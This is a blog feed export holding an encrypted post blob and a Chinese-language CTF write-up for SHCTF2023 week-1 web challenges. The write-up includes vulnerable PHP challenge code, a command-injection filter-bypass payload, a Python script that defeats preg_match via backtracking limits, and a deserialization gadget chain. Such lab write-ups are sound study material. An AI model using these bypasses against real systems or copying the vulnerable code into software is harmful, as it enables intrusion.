164f1bd0c86962e4a34b99ad2bd4e9239f89e477725e0595336dfc95776aa154d6ab6fc194183e65355e382854e18273fa776ba0ca3e0c98847d7394d8ee3c6ea29f6874ded6d1625a6e53b947a621be5b456b1eba8975fd9bf0d225b429e49e5c82969fa4eccfacd1f0807c71c4bb2a953c165ceb5b836e069f916ff2e619f7e7bfcd91461b7ff588e8b75ca9bea9df057cd79a0ddacac83e4cd670399a970d27e17ba86937088c4d69f3e904becd36d50e7ade02cc24f4316d2b9b1f30e848305f2dc05329f1d1c7047a7b0c3a45b90d647ff729701acb808021bef2476cbb2addc090b260de65b055cecc095e9b323da7924dbe1b98e481a61ecbe16a5a7c9ff39c722fb425bf97b7b34bc3ede2807e5b79cff8c770256b2ed2fec23c5c05420824bde1c68ab869fc870013c35d4569bc7b04dcf3e89c4009e46e14f27e66dbe166e34a9f7bd26de034bd9511ce1c51f11191f83eed26f1bc9ee884121878a289489dc9ca0b26a6c06e1774ea679a50e78df6f4e01720efe33520c9b8e841ce73e98020a6067203b28c343019e6094aeb88cb207b09b3ea0688090cfe51af4287ef1b7d7053dac9b22ad2d6264c2ba1bd0f4fd93776c4e2b0e7968b91c29eaed180669fabbb19b3f2e16ee25f75a34ebb232c71554a1cf597113a0e5c686cf3820b6794cb8a306c4c9e1f6812a0bf67e78f52c37d9fa48be5630040275f13328abba8aca69d912dfd2f133933ebbeea7d5d4f39adad2a71ae5be40e4e23007cf92fedc8ca8b725d2a9382833027a0e45c4ee3ceeb810127ee28d070218bdf78dc666acee5b156949d9479e8d5e659eca48e9cc64bb2d45bead876369b6658799db5d274d2b82f7041c66fce365da55a35542f82e584bf69f8889cf4253acf010e4c660e97ffc4352ef99de36304cfcab334ee0f91047a07adfb21bb780a6841b4ac6f2b677f6c40c094aa5151e6569a9fe146dd3df495579bf6adf43bf65289be6da6a81153966f4da76b235fb47512389ac22ca0b9e044debcdcd3c0418cf2524f8c3b52ad3ed4cf621698c5b4f7b9c5fc4422ccb401eccc3a18268ee4e23e95a4b385250f987890afb91b1d8dc91504d95f9289fb31a40be73a9a642d5822f2c1dc9c683fef3669a605cf360c8b18fd7316fce6587e2b4bb07825a77d541c9aa3deba59ff15aadfb269aaa39069170dbad1f3ddfdf2014dab0ca6434465d0f8af4500bc481ec8690afb5cb343ebb128cfc2bb1bacfec68b68842f166e7a30841a7466737fa3ad8333e68e8daa713154d6c25c8907eec59b58796e5b5087bf82cd747441d28e72459175f4c9bfe31324040124bf5554f85c043102780c22ef42d191300ae4cc1ffd9765092d6899dcd248d19c493df387b4ee0373fa33fb90753c867acc83d5c9c3db995e7933ba92f342e937094ee0ce82b84add88dbc490787feb8232f11726f8352492f8704115d33276a27f3c776dd07996a985672fd37dc81ce611c4cc7de17c20f788181e57bd072c9afb85bd064ab992b104700400f7e990e89d791ba509f1a6ecf654b1c42df59ee2f5eaec8048b601d6f480dffd04fcadab708ec9275d3af13ce0509b751a2527654621fd3a31b3996617464af28950bbbcf4db7906f815e96623e4071abdadabc4b2163106858cb15dc6ce0e4b092c4a24d0a29fca1e37dade1fed34d7023919d26487ec0bfe46f1e06cf6d03d6b4bc26517c50d3a7530271fa089267584162d3dbcbaefb66909a2c32aa1d62128b8c82b8ab2937983dc2d86f1a9ec0e3706d92057e3c96ebbf87f329b8cfe1fc81ab5c4921fd453b211d4287622ffa5e155b015066d556e5af6b9c66a95eb9ec264e598d463ecc4b66b7d621a1323251937fd6020540e9f8c36cf80164d4f4fd66fecf4b6cd140d496c6563f9c834bb370a7674a169ed2fe97a4a08ec11ebd3be6a8b9c6cb8726fcfa2c831eb4ece6558f223b58207ee6330c5767003677727ce3fc3a2de1c9603e58a300cd13447a2fd2c1e0185fb36e1e19a69a929335014000a52599e35dfde20578191f911f263b75f7c31d2552b349b019adffb50a024e1dfd5cd0cf2733f5efc829d53c2a59681f47006e281b91f0a47d06322e793de289fee9d7f04c730272f54d29e9ac124de45ea7803e384478196ba2331067cd7f6d3a4d53145e5b533fd9c0ecf2c09787a0dcb249e18a361985a4454a9e29db73ebf4e162a88d42a32c36e9b4a15fb9f6979562ce3aa0d40016a810074b3685fe73637527a38ed9d6491645a900e0af5109aab895ca6325565aaf3dba363424fa83662e38ac885ad3958c48e844c2160f2eb1b3606d2c93bae3f1a7094c00c1c822d55d6dc3db00ce67158bbee486ef17f3e0def7d2f040cf74dc42020744ffb569854f8b7dfb6134a8283d74723a3f0e3893c36cf715bf99f2e770d85918031148be276eeb6e8157f41078b0f62a32ac1f8118cded7d379e67927bf69acf81a6ec99eeb893e77694d5db46e49bb689a18105c51eab7b93d8ef0a78942d1e3bcfa4b3dbac1ac35522c755b7cfead70dee93ce4801bdacc9bd4a6dbecfa71be0aeaa4b6a76049c7815ae7148675931ee8daf14dbd0d5f5b758afd67f448b85459194c95e9ba4a07d2bebaea7d2375076ccaea15a41d04e41e6e7f4980579a6024272fec0dde4e1e1cfc9f48a5c0aedc4a0c0aa7dfe0f0a48a9aecfc50b5de1575d297846e7a0f0ae02542b542c79380d8eff28439d27ab8310d6d815fb310695336043eeda4516b2dba07300231dc5fc58cb845530f0d44d1e9da4ed466214f326f6d8e76344600dfc5bbd247dded24e583eac0e7b954c4212770867380066f7bb7325d9a16291d53f69a1b784a9ef45ff1b9e349602a2bc6c90cb2e6b132e995d2e5149e37b145ff1d8f800717c064a43b0700e5d4ee3f3212740c1dc96dfae429c8e4ea1a8c88dab3743edc54c726fe7756a19306c909096f8125cea6e291cb49dea50db3219cfe72ccbb5f4691c5f3cfe1d141cbf28d7e9fae44db2a7073d0a79e19ce0d1139778bf7d2e5901d033889480e33db280352e846ac6b8a184bc71601fb2bb70b33621322c8d276eb0c99dc2532cbe1d6a8142e09a292d745327cf19a64531dddcb8305091ad78a9b595c26e3c24256362c4347c4bdad5c47815d6b2fe25a32e2e24c6914bb88e3252c89097f829a7a97db4faf85add22981c6ae4dc112bd7e298b8f026050e0ae5be5e3d75fb5a7f8464da5c40fb99c1bd6806e78cf9e3b6d543452a95b4f1a59c027367fa913459f15b4e2d38e781a2a8938aeb0b3a7248866be6917f3e95bae329a59da4fccfec23ec844ba628a37e710081d1495d41c0a03d06671434d7b6b23fa5d6c2e9547e2aeb0d0c773c1d2fed5812f063bad66a3e4989d3d9cee6c51a4f5266f72c4616517cdbe1a487f22a22493fe5f3e0063bab6d02a4e739eab80efdd9d03734982dda0041cc4d5693cb02ef78134ab5bc52c623292346db50f59c6899287b465e37e589d44638466d358f0cf77b0b306fe61a7165dbed198f466000b76441f4260dda1908df6d640e2feec26f7ceb5a0933d89746c0e10d43bd60ee2cd7915b4b74c12a3bf8f8ba115bcba88965acfe1f9ae83982b0af8c4ba12b0a666267e86814595401ba7957382b4d107b7f99ac22de3b736b4b02eedf88860a307946ad8d0f40094ea346a1cc282bd23beef28a16dfaaa5fa3c3b1de725d44df84320b0ae8d6ebca30dfebaa4f6e8c859da90ebee3624bf69794680ac21dce9d59b7d0fa771113fb57e7cfb74f12742dc612bf15fa47dc538b6dffb8587a815321ebcc168e730b2d3bb49a1471bd10fc4feb5da194e8ef2edbf5437963f8de36cb603fe56107522658f91e193d95241dbe7de820b2567d745f6d5c147ff7987a47680d8dcbf8c8f9542a41d39c08781076c23cca077e5c99f93e1c35d7c09fcd7eef08582f7e3cfc6300bf23f7bfefac350c2702c4d00e53b3e569c7f5602d8cd38f808c6191eee18def0778d62d3cc8e86aab6b6b06a51fb831125e1d3a150393edba11d3aead2a0002f8d0b86ed86ed8ca98c1ae278a74c80088e7ba95fa5fa18f0a21e830749aec848232da21b284ba9df40e5b92de2eaaf8feffdb7c8376fa5daa05042a31bc46a082f48dfeeb356398900216ec25d9807607baee679ac1d8ee27b73d8d7d7184ded395112fd33526dbd75af61de1731ed8ff3d1cf0b419942b81596173fae6cd07f06f93b1469dfddabc9db7414543a0861989e938a09334f19ffb9b6bf925d985fbe42e86bd86297a92077b560a353cbc7487737c528c8d905d9bcc81caede65c354655c6abdb658e293757ac70124fc2f8ec821f69dc403d814642617c27f333610f1bf9dc359e39965254efadf6e2861edced17df73ec8cb5b0f906f7327fc023a4e9b44f100527bebf31649963edc4441e3de98b09cab552ecc3d54dfe8501f513e241511defd0c26836b62f886ebfc2e56f22d7a9c7bf0588c66c321eee47e46c2cecaefbd23c2030233a0ba361e0e16f0e7e6a6456b98dbbe22ba5fc3e1e71c472d5e269aaf36d4499a97153459697bf67fdf1d97d4c6c7a809000066b0d56f02144a28f8d749a4f2e54f27c5528876ad5de55db7</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>èµ›äº‹WP</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>SHCTF2023</title>
    <url>/2023/10/06/SHCTF2023/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h3 id="WEEK1-babyRCE"><a href="#WEEK1-babyRCE" class="headerlink" title="[WEEK1]babyRCE"></a>[WEEK1]babyRCE</h3><p>è€ƒç‚¹ï¼šå‘½ä»¤æ‰§è¡Œç»•è¿‡</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token variable">$rce</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'rce'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$rce</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/cat|more|less|head|tac|tail|nl|od|vi|vim|sort|flag| |\;|[0-9]|\*|\`|\%|\>|\&lt;|\'|\"/i"</span><span class="token punctuation">,</span> <span class="token variable">$rce</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$rce</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hhhhhhacker!!!"</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>è¿‡æ»¤äº†catï¼Œä½¿ç”¨<code>rce=c\at$&#123;IFS&#125;/fl??</code>ã€‚</p>
<h3 id="WEEK1-1zzphp"><a href="#WEEK1-1zzphp" class="headerlink" title="[WEEK1]1zzphp"></a>[WEEK1]1zzphp</h3><p>è€ƒç‚¹ï¼šæ•°ç»„ç»•è¿‡ï¼Œå›æº¯ç»•è¿‡preg_match</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'./index.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c_ode'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c_ode'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$num</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[0-9]/"</span><span class="token punctuation">,</span> <span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no number!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">elseif</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/.+?SHCTF/is'</span><span class="token punctuation">,</span> <span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
      <span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'no touch!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
      <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'2023SHCTF'</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">)</span>
      <span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'what do you want'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
      <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/.+?SHCTF/is'</span><span class="token punctuation">,</span> <span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
      <span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'no touch!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
      <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'2023SHCTF'</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">)</span>
      <span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'what do you want'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
      <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>è¿™é‡Œé¦–å…ˆè¦åŒ¹é…SHCTFå‰é¢æ˜¯å¦æœ‰å­—ç¬¦ï¼Œç”±äºæœ‰**.**çš„é™åˆ¶ï¼Œä»¥åŠ&#x2F;isä¿®é¥°ç¬¦çš„é™åˆ¶ï¼š</p>
<blockquote>
<ul>
<li>i (PCRE_CASELESS)<br>å¦‚æœè®¾ç½®äº†è¿™ä¸ªä¿®é¥°ç¬¦ï¼Œæ¨¡å¼ä¸­çš„å­—æ¯ä¼šè¿›è¡Œå¤§å°å†™ä¸æ•æ„ŸåŒ¹é…ã€‚</li>
<li>s (PCRE_DOTALL)<br>å¦‚æœè®¾ç½®äº†è¿™ä¸ªä¿®é¥°ç¬¦ï¼Œæ¨¡å¼ä¸­çš„ç‚¹å·å…ƒå­—ç¬¦åŒ¹é…æ‰€æœ‰å­—ç¬¦ï¼ŒåŒ…å«æ¢è¡Œç¬¦ã€‚å¦‚æœæ²¡æœ‰è¿™ä¸ª ä¿®é¥°ç¬¦ï¼Œç‚¹å·ä¸åŒ¹é…æ¢è¡Œç¬¦ã€‚è¿™ä¸ªä¿®é¥°ç¬¦ç­‰åŒäº perl ä¸­çš„&#x2F;sä¿®é¥°ç¬¦ã€‚ ä¸€ä¸ªå–åå­—ç¬¦ç±»æ¯”å¦‚ [^a] æ€»æ˜¯åŒ¹é…æ¢è¡Œç¬¦ï¼Œè€Œä¸ä¾èµ–äºè¿™ä¸ªä¿®é¥°ç¬¦çš„è®¾ç½®ã€‚</li>
</ul>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/3557032fdb5c4508b9d2d555b8040c38.png" alt="1"></p>
<p>è¿™è¡Œä»£ç çš„ä½œç”¨æ˜¯æ£€æŸ¥å˜é‡ $code ä¸­æ˜¯å¦åŒ…å«ä»»æ„å­—ç¬¦ï¼ˆåŒ…æ‹¬æ¢è¡Œç¬¦ï¼‰ï¼Œç„¶åç´§è·Ÿç€ SHCTFï¼ˆä¸åŒºåˆ†å¤§å°å†™ï¼‰ã€‚å¦‚æœåŒ¹é…æˆåŠŸï¼Œæ¡ä»¶è¯­å¥å°±ä¼šä¸ºçœŸï¼ˆtrueï¼‰ï¼Œå¯ä»¥æ‰§è¡Œæ¡ä»¶ä¸ºçœŸæ—¶çš„ä»£ç å—ã€‚</p>
<p><strong>è¿™é‡Œå¯ä»¥ä½¿ç”¨æ­£åˆ™å›æº¯æœ€å¤§æ¬¡æ•°ä¸Šé™ç»•è¿‡preg_match</strong><a href="https://xz.aliyun.com/t/10219">å‚è€ƒé“¾æ¥</a><br>æœ€åçš„pythonè„šæœ¬</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests

<span class="token comment"># ç›®æ ‡URL</span>
url <span class="token operator">=</span> <span class="token string">'http://112.6.51.212:31314/?num[]=m'</span>  <span class="token comment"># è¯·æ›¿æ¢ä¸ºå®é™…çš„ç›®æ ‡URL</span>

<span class="token comment"># è¦å‘é€çš„POSTå‚æ•°</span>
payload <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'c_ode'</span><span class="token punctuation">:</span><span class="token string">'very'</span><span class="token operator">*</span><span class="token number">260000</span><span class="token operator">+</span><span class="token string">'2023SHCTF'</span><span class="token punctuation">&#125;</span>

<span class="token comment"># å‘é€POSTè¯·æ±‚</span>
response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>payload<span class="token punctuation">)</span>
<span class="token comment"># æ‰“å°å“åº”å†…å®¹</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>çŸ¥è¯†ç‚¹ï¼š<br><a href="https://www.sqlsec.com/2020/07/preg_replace.html">å›½å…‰å¸ˆå‚…çš„PHP preg_ç³»åˆ—æ¼æ´å°ç»“</a></p>
<h3 id="WEEK1-ez-serialize"><a href="#WEEK1-ez-serialize" class="headerlink" title="[WEEK1]ez_serialize"></a>[WEEK1]ez_serialize</h3><p>è€ƒç‚¹ï¼šphpååºåˆ—åŒ–<br>ä¸å¤ªæ“…é•¿phpååºåˆ—åŒ–ï¼Œè¿˜æ˜¯è¦å¥½å¥½çœ‹æ¯ä¸€é“ååºåˆ—åŒ–é¢˜ã€‚ã€‚ã€‚</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">A</span><span class="token punctuation">&#123;</span>
  <span class="token keyword">public</span> <span class="token variable">$var_1</span><span class="token punctuation">;</span>
  
  <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
   <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">var_1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">B</span><span class="token punctuation">&#123;</span>
  <span class="token keyword">public</span> <span class="token variable">$q</span><span class="token punctuation">;</span>
  <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/gopher|http|file|ftp|https|dict|\.\./i"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">q</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hacker"</span><span class="token punctuation">;</span>           
        <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">C</span><span class="token punctuation">&#123;</span>
  <span class="token keyword">public</span> <span class="token variable">$var</span><span class="token punctuation">;</span>
  <span class="token keyword">public</span> <span class="token variable">$z</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">z</span><span class="token operator">-></span><span class="token property">var</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">D</span><span class="token punctuation">&#123;</span>
  <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$function</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">p</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token variable">$function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>  
<span class="token punctuation">&#125;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'payload'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'payload'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>å…³é”®æ˜¯Aç±»ä¸­çš„<strong>include()å‡½æ•°</strong>é€šè¿‡æ–‡ä»¶åŒ…å«æ‹¿åˆ°flagã€‚<br>å¼€å§‹ä¸²é“¾å­ã€‚ã€‚ã€‚</p>
<p><code>** __invokeé­”æœ¯æ–¹æ³•**</code></p>
<blockquote>
<p>é­”æœ¯æ–¹æ³• __invoke() ä¼šåœ¨å°†ä¸€ä¸ªå¯¹è±¡å½“ä½œä¸€ä¸ªæ–¹æ³•æ¥ä½¿ç”¨æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨ã€‚<br>ä¸‹é¢çš„ä»£ç ï¼Œæˆ‘ä»¬ç»™ <code>Person</code> ç±»æ·»åŠ ä¸Š <code>__invoke()</code> é­”æœ¯æ–¹æ³•ï¼Œç„¶åæˆ‘ä»¬å°±å¯ä»¥å°†å®ƒçš„å®ä¾‹å½“ä½œæ™®é€šæ–¹æ³•æ¥è°ƒç”¨äº†ã€‚</p>
</blockquote>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Person</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$sex</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$age</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token operator">=</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span>  <span class="token variable">$age</span><span class="token operator">=</span><span class="token number">25</span><span class="token punctuation">,</span> <span class="token variable">$sex</span><span class="token operator">=</span><span class="token string single-quoted-string">'Male'</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">age</span>  <span class="token operator">=</span> <span class="token variable">$age</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">sex</span>  <span class="token operator">=</span> <span class="token variable">$sex</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token string single-quoted-string">'ä½ å¥½ï¼Œæˆ‘çš„åå­—æ˜¯: '</span><span class="token operator">.</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'ï¼Œæˆ‘ '</span><span class="token operator">.</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">age</span> <span class="token operator">.</span><span class="token string single-quoted-string">' å²äº†ã€‚'</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token variable">$person</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Yufei'</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'Male'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">echo</span> <span class="token variable">$person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
